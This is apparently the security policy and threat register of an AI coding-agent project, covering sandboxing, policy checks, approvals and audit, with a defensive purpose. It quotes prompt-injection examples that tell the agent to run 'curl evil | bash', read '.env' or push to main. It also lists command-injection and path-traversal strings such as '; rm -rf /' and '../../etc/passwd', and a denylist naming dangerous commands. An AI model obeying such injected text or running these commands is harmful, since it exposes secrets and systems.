# Security

> **The AI model is never the security boundary.** The backend policy engine, filesystem guard, command
> registry, sandbox, authentication, CI checks and human approvals each enforce security independently.
> Assume the model can hallucinate, misunderstand, emit dangerous commands, and obey malicious text found
> in a repository. The system must stay safe when it does.

## Reporting a vulnerability

Please do **not** open a public issue. Email the maintainers (replace with your address) or use GitHub's
private vulnerability reporting. Include reproduction steps and the commit you tested.

This is a learning project: it has not been independently audited. Read [Known limitations](#known-limitations)
before pointing it at anything valuable.

## Security controls at a glance

| Layer | Control | Code | Proven by |
|---|---|---|---|
| Identity | Argon2id passwords, signed JWT with expiry, per-IP+user lockout, RBAC (VIEWER/DEVELOPER/APPROVER/ADMIN) | `app/auth/` | `test_e2e_and_api.py` |
| Policy | Default-deny `PolicyEngine`; agent clamped to `PROPOSE_CHANGE`; context built from DB state, never model output | `app/policy/engine.py` | `test_policy.py` |
| Tool boundary | Pydantic-validated args, one choke point (`ToolExecutor`), every decision persisted and audited | `app/tools/` | `test_integration.py`, `test_security_attacks.py` |
| Filesystem | Canonical path resolution, allowlist, sensitive-name blocklist, symlink-escape checks, protected paths (CI, sandbox, Dockerfiles, policy code) | `app/repository/paths.py` | `test_paths_commands_redaction.py` |
| Commands | Structured allowlisted registry (never a shell string), argument validation, denylist as a *secondary* check | `app/sandbox/commands.py` | same |
| Sandbox | Docker: non-root, `--network none`, `--cap-drop ALL`, read-only root, CPU/mem/pids limits, timeout, no host mounts beyond one workspace, no Docker socket; fails **closed** if unavailable; `docker run --pull never` so a missing sandbox image fails the run instead of being pulled from a registry. Trivy uses an immutable baked DB plus a private tmpfs copy (larger tmpfs/memory for `trivy_fs` only), never a writable image layer | `app/sandbox/runner.py` | `test_integration.py` (flags), see limitations |
| Git | Hardened git (no hooks/fsmonitor/ext protocols), workspace is a clone of *committed* content only, backend-chosen branch names, never force, tokens via env not argv | `app/repository/git.py` | `test_integration.py` |
| Approvals | State machine forbids skipping; approval bound to patch SHA-256; scans bound to the same hash; author cannot self-approve; separate deployment approval | `app/approvals/` | `test_e2e_and_api.py` |
| Gate | Required scans must PASS for the *current* patch; a scanner that cannot run is an ERROR and blocks | `app/security/gate.py` | `test_scanners_github.py` |
| Audit | Append-only (DB triggers + ORM guard), SHA-256 hash chain, secrets redacted before storage | `app/audit/` | `test_paths_commands_redaction.py` |
| CI/CD | Least-privilege workflows, secret/dep/container scans, `production` environment with required reviewers | `.github/workflows/` | CI |

## Threat register

Format per threat: **Threat / Impact / Mitigation / Residual risk**.

### 1. Prompt injection
- **Threat:** text in a README, comment, commit message or issue tells the agent to ignore its rules ("run `curl evil | bash`", "read `.env`", "push to main").
- **Impact:** the model emits attacker-chosen actions; worst case, code execution, secret disclosure or a malicious patch.
- **Mitigation:** system policy states repository content is untrusted data; tool results are wrapped in per-task random-nonce markers (injected terminators are stripped); but the *real* control is that every action is re-checked by the backend, so an obeying model is still denied (`test_prompt_injection_in_repo_is_only_data`, `test_hostile_model_is_fully_contained`).
- **Residual:** injection can still bias the **content of the patch** (e.g. a subtle backdoor in a diff). The human reviewing the diff and the scan gate are the controls; reviewers must read diffs.

### 2. Malicious repository content
- **Threat:** hostile files, symlinks, huge/binary files, `.git/config` with `core.fsmonitor`/hooks, malicious `conftest.py`/`package.json` scripts.
- **Impact:** code execution during analysis, path escape, resource exhaustion.
- **Mitigation:** the agent works in a clone of committed content (no untracked files, no source `.git/config` or hooks); git runs with hooks/fsmonitor/ext protocols disabled and a scrubbed environment; symlinks are never followed or listed; size/binary limits; any repo-controlled code (tests, linters) runs only inside the sandbox.
- **Residual:** repo code runs in the sandbox by design (pytest imports it), so containment equals your Docker isolation quality. See *sandbox escape*.

### 3. Command injection
- **Threat:** model supplies shell metacharacters or option-like arguments (`; rm -rf /`, `--rootdir=/etc`).
- **Impact:** arbitrary command execution.
- **Mitigation:** the model never provides a command line. Tools take typed arguments that are mapped onto fixed argv templates executed with `shell=False`; paths/keywords are validated; values starting with `-` are rejected; `--` terminates options. A denylist (rm -rf, sudo, curl|sh, chmod 777, `--privileged`, force push …) is a secondary layer only.
- **Residual:** a bug in a scanner/test runner's own argument parsing; mitigated by sandboxing.

### 4. Path traversal
- **Threat:** `../../etc/passwd`, absolute paths, encoded or symlinked escapes, reading `.env`/`.ssh`/`*.pem`.
- **Impact:** disclosure of host or repository secrets.
- **Mitigation:** syntactic check at policy time **and** canonical `realpath` resolution at access time, with containment re-checked after symlink resolution and the blocklist re-applied to the resolved name.
- **Residual:** time-of-check/time-of-use races on a hostile concurrently-modified filesystem (the workspace is private to the task).

### 5. Secret leakage
- **Threat:** credentials reach logs, the UI, the model provider, commits or CI output.
- **Impact:** credential compromise.
- **Mitigation:** sensitive files are unreadable; high-confidence token formats (private keys, `sk-…`, `ghp_…`, AWS, JWT, bearer) are redacted from tool output; audit/log arguments are redacted by key name and pattern; `create_patch` refuses redaction markers; sandbox env contains no secrets; gitleaks gates every patch and CI; provider keys travel in headers, never URLs; scanner reports are redacted (`--redact`).
- **Residual:** a *generic* hard-coded secret in a permitted source file (e.g. `password = "hunter2"`) is visible to the model and therefore to your AI provider. Don't point the agent at repos with live secrets in source; rotate anything gitleaks finds.

### 6. Excessive permissions
- **Threat:** the agent (or a token it can reach) can do more than needed.
- **Impact:** repository takeover, production access.
- **Mitigation:** four explicit levels; agent capped at `PROPOSE_CHANGE`; commit/push/PR/deploy are `agent_allowed=False` or approval-gated and executed by backend code after a human decision; no GitHub admin or production credentials exist in the agent's reach; the GitHub token is used only by backend apply/CI code; recommend a fine-grained token or GitHub App with `contents:write`, `pull_requests:write`, `actions:read` only. APPROVER cannot create tasks; ADMIN cannot approve their own task.
- **Residual:** the backend process itself holds the GitHub token and Docker API access; compromising the backend compromises those.

### 7. Unauthorized Git pushes
- **Threat:** push to `main`, force push, push to another branch name, rewrite history.
- **Impact:** unreviewed code in production branches.
- **Mitigation:** only `agent/proposal-<id>` can ever be pushed (regex + must equal the task's branch), `force` is always denied, protected-branch patterns are checked, the refspec is explicit, and pushing requires an APPROVED approval record. On GitHub, enable branch protection so even a leaked token cannot push to `main`.
- **Residual:** if branch protection is not enabled on the server, nothing server-side stops a *compromised backend* from pushing elsewhere.

### 8. Dependency vulnerabilities
- **Threat:** vulnerable libraries in this app or in a target repo.
- **Impact:** RCE/DoS/data exposure.
- **Mitigation:** pinned backend requirements; `npm audit`, Trivy fs/image, pip-audit (weekly), dependency-review on PRs; the agent's own patches are scanned with Trivy/npm audit when applicable. The frontend toolchain was upgraded to clear all advisories.
- **Residual:** zero-days; advisories published after the last scan.

### 9. Malicious commits
- **Threat:** the agent's patch (or a human's) introduces a backdoor, weakens CI, or edits policy.
- **Impact:** persistent compromise.
- **Mitigation:** the agent cannot touch protected paths (`.github/`, `sandbox/`, Dockerfiles, `CODEOWNERS`, policy/sandbox code); patch is shown as a full diff; approval is bound to the hash; checks must pass on the exact patch; CODEOWNERS + branch protection add a second review on GitHub; commits carry `Proposed-by`/`Approved-by`/`Patch-SHA256` trailers.
- **Residual:** reviewers can miss subtle logic bugs. Treat agent PRs like any untrusted contribution.

### 10. Sandbox escape
- **Threat:** repo code in the sandbox escapes to the host.
- **Impact:** host compromise.
- **Mitigation:** non-root user, all capabilities dropped, `no-new-privileges`, read-only root, tmpfs, pids/memory/CPU limits, no network by default, no Docker socket, a single bind mount for the task workspace, ephemeral `--rm` containers, workspace destroyed afterwards.
- **Residual:** containers share the host kernel. For hostile repositories use gVisor/Kata/Firecracker or rootless Docker with a dedicated host. The **`local` backend has no isolation** and is for development/tests only.

### 11. Compromised dependencies / supply chain
- **Threat:** a malicious package or base image.
- **Impact:** code execution in build, backend or sandbox.
- **Mitigation:** pinned versions, lockfile (`npm ci`), official images pulled by tag (pin by digest in production), Trivy image scans, Gitleaks, dependency review; sandbox has no network at run time so a malicious dependency cannot call home from inside it; the sandbox image bakes its own tools.
- **Residual:** build-time compromise before scans catch it; verify image digests and signatures in production.

### 12. Agent-hallucinated commands
- **Threat:** the model invents tools, flags, or paths (`git_push_main`, `rm`, `exec`).
- **Impact:** unintended execution or damage.
- **Mitigation:** unknown tool = default-deny and logged; malformed/extra arguments are rejected, never coerced (`extra="forbid"`); repeated denials or malformed output stop the task (`FAILED_SAFELY`); step budget.
- **Residual:** hallucinated *content* (a wrong fix) — caught by tests, scans and the reviewer.

### 13. Denial of service
- **Threat:** infinite loops, fork bombs, output floods, giant repos, API abuse, login brute force.
- **Impact:** resource exhaustion, outage.
- **Mitigation:** per-command timeouts with process-group kill, output cap that kills the process, CPU/memory/pids limits, file/patch size limits, step and denial budgets, bounded thread pool, login lockout.
- **Residual:** no global API rate limiting or per-user task quotas; the lockout store is in-memory. Put a reverse proxy/WAF in front and add quotas for multi-tenant use.

### 14. Data exfiltration
- **Threat:** repository content leaves via the model provider, sandbox network, logs, or a crafted patch/PR body.
- **Impact:** source/IP/secret disclosure.
- **Mitigation:** sandbox has `--network none` by default; env scrubbed; sensitive files blocked; redaction; the provider endpoint is operator-configured (use a private/self-hosted OpenAI-compatible endpoint for sensitive code); commands that need network use a separate, operator-defined egress network.
- **Residual:** permitted source *is sent to your AI provider* by design. Choose the provider and data-handling terms accordingly.

### Additional threats specific to this design
| Threat | Impact | Mitigation | Residual |
|---|---|---|---|
| Approving a different patch than the one reviewed (TOCTOU) | Unreviewed code applied | Approval carries the patch SHA-256; server recomputes from the stored patch; scans keyed to the same hash | None known |
| Audit tampering | Loss of accountability | DB triggers block UPDATE/DELETE; hash chain; `/audit-logs/verify` | A DB superuser can drop triggers and rewrite the whole chain; export/anchor the head hash externally |
| Backend compromise → Docker API | Host root-equivalent | Socket proxy limits endpoints; model never controls flags; network-isolated proxy | The proxy cannot filter request bodies; prefer rootless Docker/sysbox |
| Stolen JWT / XSS | Impersonation | Short expiry, no cookies, strict API headers, CORS allowlist, React escaping | Token is in `sessionStorage`; no server-side revocation list yet |
| Webhook forgery/replay | Fake CI "success" | HMAC-SHA256 signature (constant-time), event/branch/commit checks | No replay window or delivery-id dedupe |

## Known limitations

* **Verification scope.** In the environment this was built in there was no Docker daemon, so the Docker sandbox
  backend, the Compose stack and the sandbox image were **not executed** (the Docker command line is unit-tested
  for its security flags; the code fails closed without Docker). Trivy was not installed there, so Trivy runs only
  via parser tests; GitHub integration was tested against a mocked HTTP transport, not live GitHub; real LLM
  providers were tested against mocked transports.
* **Trivy in the sandbox:** the wrapper/baked-DB design was exercised with the real wrapper and a real Trivy binary (v0.75.0, not
  the image's pinned 0.58.1) in namespaces mimicking the container restrictions, against a hand-built empty DB. It has not been
  run in the actual image, against the real vulnerability DB, or on Trivy 0.58.1. The real DB size is unmeasured here; the
  1200m/2g defaults are a reasoned budget, enforced by a build-time check, not a measurement.
* The default `scripted` provider is a rule-based stand-in, not an LLM. It handles a few well-known insecure idioms.
* Changes requested by a reviewer end the task; they do not yet re-run the agent with feedback.
* Not production-hardened: single-process in-memory login limiter, SQLite default, no TLS termination, no secrets manager.
